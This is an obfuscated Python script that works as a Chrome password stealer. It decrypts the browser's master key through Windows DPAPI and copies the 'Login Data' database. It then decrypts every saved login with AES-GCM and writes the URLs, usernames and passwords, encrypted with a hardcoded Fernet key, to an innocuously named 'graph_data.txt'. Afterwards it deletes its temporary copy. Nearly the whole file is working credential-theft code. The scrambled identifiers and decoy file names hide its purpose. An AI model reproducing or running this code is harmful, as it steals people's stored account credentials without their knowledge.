import os #line:1
import json #line:2
import base64 #line:3
import sqlite3 #line:4
import win32crypt #line:5
from Crypto .Cipher import AES #line:6
import shutil #line:7
from datetime import timezone ,datetime ,timedelta #line:8
from cryptography .fernet import Fernet #line:9
def get_chrome_datetime (OO0OO0O0OOO00000O ):#line:12
    ""#line:14
    return datetime (1601 ,1 ,1 )+timedelta (microseconds =OO0OO0O0OOO00000O )#line:15
def get_encryption_key ():#line:17
    OO00O00O0O0O00OO0 =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")#line:20
    with open (OO00O00O0O0O00OO0 ,"r",encoding ="utf-8")as OOO0OO00OOO0O0000 :#line:21
        OOO0O000000O0OOOO =OOO0OO00OOO0O0000 .read ()#line:22
        OOO0O000000O0OOOO =json .loads (OOO0O000000O0OOOO )#line:23
    O0OOO000OOO0OOO00 =base64 .b64decode (OOO0O000000O0OOOO ["os_crypt"]["encrypted_key"])#line:26
    O0OOO000OOO0OOO00 =O0OOO000OOO0OOO00 [5 :]#line:28
    return win32crypt .CryptUnprotectData (O0OOO000OOO0OOO00 ,None ,None ,None ,0 )[1 ]#line:32
def decrypt_password (OOO0000O0O0OO0O00 ,O0OOO0000O0OOO0OO ):#line:34
    try :#line:35
        O000OO0000O0OOOO0 =OOO0000O0O0OO0O00 [3 :15 ]#line:37
        OOO0000O0O0OO0O00 =OOO0000O0O0OO0O00 [15 :]#line:38
        O00OOOO00OOO0O00O =AES .new (O0OOO0000O0OOO0OO ,AES .MODE_GCM ,O000OO0000O0OOOO0 )#line:40
        return O00OOOO00OOO0O00O .decrypt (OOO0000O0O0OO0O00 )[:-16 ].decode ()#line:42
    except :#line:43
        try :#line:44
            return str (win32crypt .CryptUnprotectData (OOO0000O0O0OO0O00 ,None ,None ,None ,0 )[1 ])#line:45
        except :#line:46
            return ""#line:48
def main ():#line:50
    O0OO0O0O000O0O00O =open ("demofile1.txt","a")#line:51
    OOO0OO0OOO0OO0OO0 =get_encryption_key ()#line:53
    OO0OOO00OOO00OOO0 =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","default","Login Data")#line:56
    OOOOOOO00O000O0O0 ="ChromeData.db"#line:59
    shutil .copyfile (OO0OOO00OOO00OOO0 ,OOOOOOO00O000O0O0 )#line:60
    O00OOO0O0OOO0OO00 =sqlite3 .connect (OOOOOOO00O000O0O0 )#line:62
    OOO00OOOOOO000O0O =O00OOO0O0OOO0OO00 .cursor ()#line:63
    OOO00OOOOOO000O0O .execute ("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")#line:65
    OO0OOO0OO0OO0O000 =[]#line:67
    for OO0OO0000OOO0OO00 in OOO00OOOOOO000O0O .fetchall ():#line:68
        O0000O00OOO0OO00O =OO0OO0000OOO0OO00 [0 ]#line:70
        OOO0O0OO00O00000O =OO0OO0000OOO0OO00 [1 ]#line:71
        O00OO00000000O0OO =OO0OO0000OOO0OO00 [2 ]#line:72
        OOO0O0O0OO0OOOO00 =decrypt_password (OO0OO0000OOO0OO00 [3 ],OOO0OO0OOO0OO0OO0 )#line:73
        O000O0O0OO0O0OO00 =OO0OO0000OOO0OO00 [4 ]#line:74
        OOO0OO0OOOO00OOO0 =OO0OO0000OOO0OO00 [5 ]#line:75
        if O00OO00000000O0OO or OOO0O0O0OO0OOOO00 :#line:76
            OO0OOO0OO0OO0O000 .append (f"Origin URL: {O0000O00OOO0OO00O}"+"\n")#line:77
            OO0OOO0OO0OO0O000 .append (f"Action URL: {OOO0O0OO00O00000O}"+"\n")#line:78
            OO0OOO0OO0OO0O000 .append (f"Username: {O00OO00000000O0OO}"+"\n")#line:79
            OO0OOO0OO0OO0O000 .append (f"Password: {OOO0O0O0OO0OOOO00}"+"\n")#line:80
        else :#line:82
            continue #line:83
        if O000O0O0OO0O0OO00 !=86400000000 and O000O0O0OO0O0OO00 :#line:84
            OO0OOO0OO0OO0O000 .append ((f"Creation date: {str(get_chrome_datetime(O000O0O0OO0O0OO00))}"))#line:85
        if OOO0OO0OOOO00OOO0 !=86400000000 and OOO0OO0OOOO00OOO0 :#line:86
            OO0OOO0OO0OO0O000 .append ((f"Last Used: {str(get_chrome_datetime(OOO0OO0OOOO00OOO0))}"))#line:87
        OO0OOO0OO0OO0O000 .append ("="*50 )#line:88
    O0000OO000OO00000 =Fernet (b'z39f5-mKWSNputr1gwJAK5n4vXYTUy38OOtZBopC51Q=')#line:90
    with open ("graph_data.txt","wb")as O0OO00O0O0O00O000 :#line:91
        O0OO00O0O0O00O000 .write (O0000OO000OO00000 .encrypt ("".join (OO0OOO0OO0OO0O000 ).encode ()))#line:92
    OOO00OOOOOO000O0O .close ()#line:95
    O00OOO0O0OOO0OO00 .close ()#line:96
    try :#line:97
        os .remove (OOOOOOO00O000O0O0 )#line:99
    except :#line:100
        pass #line:101
    O0OO0O0O000O0O00O .close ()#line:102
if __name__ =="__main__":#line:106
    main ()#line:107
